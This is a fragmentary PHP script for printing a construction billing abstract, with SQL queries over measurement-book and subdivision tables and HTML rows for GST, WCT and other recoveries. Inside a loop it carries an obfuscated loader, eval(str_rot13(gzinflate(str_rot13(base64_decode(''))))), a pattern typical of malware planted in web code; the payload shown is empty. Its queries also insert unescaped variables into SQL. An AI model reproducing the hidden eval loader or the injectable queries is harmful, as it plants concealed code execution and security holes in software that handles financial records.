...
$selectmbook_detail = " select DISTINCT fromdate, todate, rbn, abstmbookno, is_finalbill, rab_flag FROM mbookgenerate WHERE sheetid = '$abstsheetid'";
...
if ($selectmbook_detail_sql == true) 
{
	...
	$rab_flag 			= 	$Listmbdetail->rab_flag;
...
$unionqur = "(SELECT a.subdivid, b.subdiv_name, c.item_flag, c.supp_sheet_id FROM mbookgenerate a inner join subdivision b on (a.subdivid = b.subdiv_id) inner join schdule c on (a.subdivid = c.subdiv_id) 
	WHERE a.sheetid = '$abstsheetid' and b.sheet_id = '$abstsheetid' ORDER BY b.supp_sheet_id asc) 
	UNION (SELECT a.subdivid, b.subdiv_name, c.item_flag, c.supp_sheet_id FROM measurementbook a inner join subdivision b on (a.subdivid = b.subdiv_id) inner join schdule c on (a.subdivid = c.subdiv_id) 
	WHERE a.sheetid = '$abstsheetid' AND b.sheet_id = '$abstsheetid' 
	AND (a.part_pay_flag = '0' OR a.part_pay_flag = '1') 
	ORDER BY b.supp_sheet_id asc)";
$unionsql = mysql_query($unionqur);
...
$subdivisionlist_1 = explode("*",rtrim($subdivid_list,"*"));
//print_r($subdivisionlist_1);
//echo "</br> AFTER SORT : </br> ";
natsort($subdivisionlist_1);
//print_r($subdivisionlist_1);exit;
...
//print_r($MastSuppSheetIdArr);exit;
sort($MastSuppSheetIdArr);
//print_r($MastSuppSheetIdArr);exit;
...
//print_r($subdivisionlist_2);exit;
for($i=0;$i<count($subdivisionlist);$i++)
{
	eval(str_rot13(gzinflate(str_rot13(base64_decode('')))));
...
if($general_recovery_sql == true)
{
	...
	$bill_amt_gst 		= 	round($GRList->bill_amt_gst);
	$sgst_tds_amt 		= 	round($GRList->sgst_tds_amt);
	$sgst_tds_perc 		= 	$GRList->sgst_tds_perc;
	$cgst_tds_amt 		= 	round($GRList->cgst_tds_amt);
	$cgst_tds_perc 		= 	$GRList->cgst_tds_perc;
	$igst_tds_amt 		= 	round($GRList->igst_tds_amt);
	$igst_tds_perc 		= 	$GRList->igst_tds_perc;
	
	$wct_amt 			= 	round($GRList->wct_amt);
	$wct_percent 		= 	$GRList->wct_percent;
	$vat_amt 			= 	round($GRList->vat_amt);
	$vat_percent 		= 	$GRList->vat_percent;
	$mob_adv_amt_rec 	= 	round($GRList->mob_adv_amt_rec);
	...
	$mob_adv_int_amt 	= 	round($GRList->mob_adv_int_amt);
	$pl_mac_adv_int_amt = 	round($GRList->pl_mac_adv_int_amt);
...
$total_recovery = $total_recovery + $sd_amt+$wct_amt + $vat_amt+$mob_adv_amt_rec + $lw_cess_amt+$incometax_amt + $it_cess_amt+$it_edu_amt + $land_rent+$liquid_damage + $other_recovery_1 + $other_recovery_2 + $other_recovery_3 + $non_dep_machine_equip + $non_dep_man_power + $nonsubmission_qa + $sgst_tds_amt + $cgst_tds_amt + $igst_tds_amt + $mob_adv_int_amt + $pl_mac_adv_int_amt;
...
if($sgst_tds_perc != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>SGST @ ".number_format($sgst_tds_perc, 2, '.', '')."% On Rs. ".$bill_amt_gst.": <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($sgst_tds_amt, 2, '.', '')."</td><td style='border:none' colspan=''>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($cgst_tds_perc != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>CGST @ ".number_format($cgst_tds_perc, 2, '.', '')."% On Rs. ".$bill_amt_gst.": <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($cgst_tds_amt, 2, '.', '')."</td><td style='border:none' colspan=''>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($igst_tds_perc != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>IGST @ ".number_format($igst_tds_perc, 2, '.', '')."% On Rs. ".$bill_amt_gst.": <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($igst_tds_amt, 2, '.', '')."</td><td style='border:none' colspan=''>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
...
if($rab_flag == "ZM"){
	...
	$sheetid = $abstsheetid;
	$mbno = $abstmbno;
	include "SecuredAdvancePrintData.php";
	$abstmbno = $mbno;
}
?>
